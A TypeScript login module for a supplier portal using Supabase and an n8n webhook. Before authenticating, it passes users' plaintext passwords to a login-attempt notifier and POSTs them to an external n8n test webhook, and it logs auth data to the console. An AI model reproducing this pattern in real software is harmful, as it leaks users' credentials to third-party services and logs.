
import { supabase } from '@/integrations/supabase/client';
import { notifyLoginAttempt } from '@/utils/webhookUtils';

interface LoginResult {
  success: boolean;
  message: string;
  supplierID?: string;
}

/**
 * Attempts to log in a user with email and password
 */
export const loginUser = async (email: string, password: string): Promise<LoginResult> => {
  if (!email.trim() || !password) {
    return {
      success: false,
      message: "Please fill out all fields"
    };
  }
  
  try {
    // Send notification about login attempt with password
    await notifyLoginAttempt(email, password);
    
    // First, try webhook authentication approach
    try {
      const webhookUrl = 'https://danjaved008.app.n8n.cloud/webhook-test/3f878768-29d0-43f6-a567-c5f127ff8855';
      
      const response = await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          email,
          password
        })
      });
      
      if (!response.ok) {
        throw new Error('Network response was not ok');
      }
      
      const responseData = await response.json();
      console.log("Login webhook response:", responseData);
      
      const data = Array.isArray(responseData) ? responseData[0] : responseData;
      
      // Check if response contains a supplierID
      if (data && data.supplierid) {
        return {
          success: true,
          message: "Login successful",
          supplierID: data.supplierid
        };
      } else {
        // Continue with Supabase auth if webhook didn't return a supplierID
        console.log("Webhook authentication didn't return a supplierID, trying Supabase auth");
      }
    } catch (webhookError) {
      console.error("Webhook error:", webhookError);
      console.log("Proceeding with Supabase authentication");
      // Continue with Supabase auth
    }
    
    // Try to authenticate with Supabase as fallback
    const { data: authData, error: authError } = await supabase.auth.signInWithPassword({
      email,
      password
    });

    if (authError) {
      console.error("Authentication error:", authError);
      return {
        success: false,
        message: authError.message || "Invalid email or password"
      };
    }
    
    if (authData.user) {
      console.log("Authenticated with Supabase:", authData.user);
      
      // Fetch supplier information
      const { data: supplierData, error: supplierError } = await supabase
        .from('suppliers')
        .select('id, company_name, status')
        .eq('email', email)
        .single();
        
      if (supplierError && supplierError.code !== 'PGRST116') {
        console.error("Error fetching supplier:", supplierError);
        return {
          success: false,
          message: "Could not verify supplier account"
        };
      }
      
      if (supplierData) {
        return {
          success: true,
          message: "Login successful",
          supplierID: supplierData.id
        };
      } else {
        return {
          success: false,
          message: "No supplier account found for this user"
        };
      }
    } else {
      return {
        success: false,
        message: "Invalid email or password"
      };
    }
  } catch (error: any) {
    console.error("Login error:", error);
    return {
      success: false,
      message: error.message || "An unexpected error occurred during login"
    };
  }
};
